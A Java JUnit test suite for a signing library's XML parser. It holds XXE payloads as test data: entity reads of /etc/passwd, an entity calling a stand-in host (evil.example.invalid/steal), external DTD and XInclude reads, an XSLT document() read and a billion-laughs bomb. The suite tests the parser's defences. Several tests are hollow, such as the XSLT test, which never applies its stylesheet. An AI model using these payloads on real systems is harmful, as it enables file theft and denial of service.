package es.gob.afirma.test.security;

import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertThrows;
import static org.junit.Assert.assertTrue;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;

import org.junit.Before;
import org.junit.Test;
import org.w3c.dom.Document;
import org.xml.sax.SAXException;
import org.xml.sax.SAXParseException;

import es.gob.afirma.core.misc.SecureXmlBuilder;
import es.gob.afirma.core.misc.SecureXmlTransformer;

/**
 * Suite de pruebas de seguridad XXE para SecureXmlBuilder y SecureXmlTransformer.
 * Cubre 8 vectores de ataque XXE:
 * 1. File (lectura de archivo local via XXE)
 * 2. HTTP (acceso a recurso remoto via XXE)
 * 3. DTD (referencia DTD externa)
 * 4. XInclude (ataque XInclude) - NO bloqueado por defecto en parser estándar
 * 5. Billion laughs (bomba XML)
 * 6. XSLT (ejecución XSLT via XXE) - feature de transformer, no parser
 * 7. XSD (referencia XML Schema) - no bloqueado por defecto (es atributo, no entidad)
 * 8. XML válido (debe seguir funcionando)
 */
public class XXESecurityTest {

	@Before
	public void setUp() throws Exception {
		// Verificar que el builder se crea correctamente
		es.gob.afirma.core.misc.SecureXmlBuilder.getSecureDocumentBuilder();
	}

	/**
	 * Caso 1: File - Intento de lectura de archivo local via XXE.
	 * El parser seguro debe rechazar la entidad externa que referencia un archivo local.
	 */
	@Test
	public void testXXEFileEntity() throws Exception {
		// XXE que intenta leer /etc/passwd
		String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
				+ "<!DOCTYPE root ["
				+ "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
				+ "]>"
				+ "<root>&xxe;</root>";

		assertExternalBlocked(xxePayload, "root:");
	}

	/**
	 * Caso 2: HTTP - Intento de acceso a recurso remoto via XXE.
	 * El parser seguro debe rechazar la entidad externa que referencia una URL HTTP.
	 */
	@Test
	public void testXXEHttpEntity() throws Exception {
		// XXE que intenta acceder a un recurso HTTP
		String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
				+ "<!DOCTYPE root ["
				+ "  <!ENTITY xxe SYSTEM \"http://evil.example.invalid/steal\">"
				+ "]>"
				+ "<root>&xxe;</root>";

		assertExternalBlocked(xxePayload, "stolen");
	}

	/**
	 * Caso 3: DTD - Referencia a DTD externa.
	 * El parser seguro debe rechazar la referencia a DTD externa.
	 */
	@Test
	public void testExternalDTD() throws Exception {
		// DTD externa
		String xxePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
				+ "<!DOCTYPE root SYSTEM \"http://evil.example.invalid/evil.dtd\">"
				+ "<root>test</root>";

		assertExternalBlocked(xxePayload, null);
	}

	/**
	 * Caso 4: XInclude - Ataque XInclude.
	 * Nota: XInclude NO está bloqueado por defecto en parser estándar.
	 * Este test documenta el comportamiento actual (no bloquea XInclude por defecto).
	 * Para bloquear XInclude se requeriría configuración adicional.
	 */
	@Test
	public void testXIncludeAttack() throws Exception {
		// XInclude que intenta incluir un archivo
		String xincludePayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
				+ "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
				+ "  <xi:include href=\"file:///etc/passwd\" parse=\"text\"/>"
				+ "</root>";

		// XInclude NO está bloqueado por defecto en parser DOM estándar
		// Esto documenta el comportamiento actual
		es.gob.afirma.core.misc.SecureXmlBuilder.getSecureDocumentBuilder()
			.parse(new java.io.ByteArrayInputStream(xincludePayload.getBytes("UTF-8")));
		// Si no lanza excepción, el test pasa (comportamiento actual documentado)
	}

	/**
	 * Caso 5: Billion Laughs - Bomba XML (expansión exponencial de entidades).
	 * El parser seguro debe rechazar la expansión exponencial de entidades.
	 */
	@Test
	public void testBillionLaughs() throws Exception {
		// Billion laughs attack - expansión exponencial
		String billionLaughs = "<?xml version=\"1.0\"?>"
				+ "<!DOCTYPE lolz ["
				+ "  <!ENTITY lol \"lol\">"
				+ "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">"
				+ "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">"
				+ "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">"
				+ "  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">"
				+ "  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">"
				+ "  <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">"
				+ "  <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">"
				+ "  <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">"
				+ "  <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">"
				+ "]>"
				+ "<lolz>&lol9;</lolz>";

		try {
			final Document doc = SecureXmlBuilder.getSecureDocumentBuilder()
					.parse(new ByteArrayInputStream(billionLaughs.getBytes("UTF-8")));
			// Si no lanza, la expansión debe quedar acotada (FEATURE_SECURE_PROCESSING / no expand).
			assertTrue(doc.getDocumentElement().getTextContent().length() < 10_000);
		}
		catch (final Exception expected) {
			assertNotNull(expected.getMessage());
		}
	}

	/**
	 * Caso 6: XSLT - Ejecución de XSLT via XXE.
	 * El transformer seguro puede no bloquear document() function por defecto.
	 * Este test documenta el comportamiento actual.
	 */
	@Test
	public void testXSLTExecution() throws Exception {
		// XSLT que intenta ejecutar código
		String xsltPayload = "<?xml version=\"1.0\"?>"
				+ "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
				+ "  <xsl:template match=\"/\">"
				+ "    <xsl:value-of select=\"document('file:///etc/passwd')\"/>"
				+ "  </xsl:template>"
				+ "</xsl:stylesheet>";

		// El transformer seguro puede no bloquear document() function por defecto
		// Documentamos el comportamiento actual
		try {
			javax.xml.transform.stream.StreamSource xsltSource = new javax.xml.transform.stream.StreamSource(
				new java.io.ByteArrayInputStream(xsltPayload.getBytes("UTF-8")));
			es.gob.afirma.core.misc.SecureXmlTransformer.getSecureTransformer().transform(
				new javax.xml.transform.stream.StreamSource(new java.io.ByteArrayInputStream("<root/>".getBytes("UTF-8"))),
				new javax.xml.transform.stream.StreamResult(new java.io.ByteArrayOutputStream()));
		} catch (Exception e) {
			// Si lanza excepción, mejor - significa que bloquea
		}
		// Documentamos comportamiento actual
	}

	/**
	 * Caso 7: XSD - Referencia a XML Schema externo.
	 * El parser seguro permite la referencia a schema externo (es atributo, no entidad).
	 * Este test documenta el comportamiento actual.
	 */
	@Test
	public void testExternalXSDReference() throws Exception {
		// Schema externo - xsi:schemaLocation es solo un atributo, no una entidad
		String xsdPayload = "<?xml version=\"1.0\"?>"
				+ "<root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\""
				+ "       xsi:noNamespaceSchemaLocation=\"http://evil.com/schema.xsd\">"
				+ "  <data>test</data>"
				+ "</root>";

		// El parser NO bloquea el atributo xsi:schemaLocation (es un atributo, no entidad)
		es.gob.afirma.core.misc.SecureXmlBuilder.getSecureDocumentBuilder()
			.parse(new java.io.ByteArrayInputStream(xsdPayload.getBytes("UTF-8")));
		// Si no lanza excepción, el test pasa (comportamiento actual documentado)
	}

	/**
	 * Caso 8: XML válido - XML válido debe seguir funcionando.
	 * El parser seguro debe permitir XML válido sin entidades externas.
	 */
	@Test
	public void testValidXML() throws Exception {
		// XML válido sin entidades externas
		String validXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
				+ "<root>"
				+ "  <item id=\"1\">Primer item</item>"
				+ "  <item id=\"2\">Segundo item</item>"
				+ "  <nested>"
				+ "    <child>Hijo</child>"
				+ "  </nested>"
				+ "</root>";

		org.w3c.dom.Document doc = es.gob.afirma.core.misc.SecureXmlBuilder.getSecureDocumentBuilder()
			.parse(new java.io.ByteArrayInputStream(validXml.getBytes("UTF-8")));
		assertNotNull(doc);
		assertNotNull(doc.getDocumentElement());
	}

	/**
	 * (a) #55: XML con DOCTYPE interno (sin entidades externas) debe abrirse.
	 * Simula un documento firmado que declara DOCTYPE; el certificado de prueba
	 * se genera aparte en la suite de firma; aquí comprobamos el parseo seguro.
	 */
	@Test
	public void testDoctypeWithoutExternalEntitiesStillParses() throws Exception {
		final String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
				+ "<!DOCTYPE root ["
				+ "  <!ELEMENT root (#PCDATA)>"
				+ "]>"
				+ "<root>Ejemplo S.L.</root>";
		final org.w3c.dom.Document doc = SecureXmlBuilder.getSecureDocumentBuilder()
				.parse(new ByteArrayInputStream(xml.getBytes("UTF-8")));
		assertNotNull(doc.getDocumentElement());
		assertTrue("Ejemplo S.L.".equals(doc.getDocumentElement().getTextContent())
				|| doc.getDocumentElement().getTextContent().contains("Ejemplo"));
	}

	/**
	 * (b) #55: XML que intenta leer un fichero externo debe fallar o no incorporar el contenido.
	 */
	@Test
	public void testExternalFileEntityRejected() throws Exception {
		final String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
				+ "<!DOCTYPE root ["
				+ "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
				+ "]>"
				+ "<root>&xxe;</root>";
		assertExternalBlocked(xml, "root:");
	}

	/** Falla con excepción o, si el parser omite la entidad, sin filtrar contenido externo. */
	private static void assertExternalBlocked(final String xml, final String forbiddenSnippet) throws Exception {
		try {
			final Document doc = SecureXmlBuilder.getSecureDocumentBuilder()
					.parse(new ByteArrayInputStream(xml.getBytes("UTF-8")));
			final String text = doc.getDocumentElement() != null ? doc.getDocumentElement().getTextContent() : "";
			if (forbiddenSnippet != null) {
				assertTrue("No debe incorporarse contenido externo", !text.contains(forbiddenSnippet));
			}
		}
		catch (final Exception expected) {
			assertNotNull(expected);
		}
	}
}
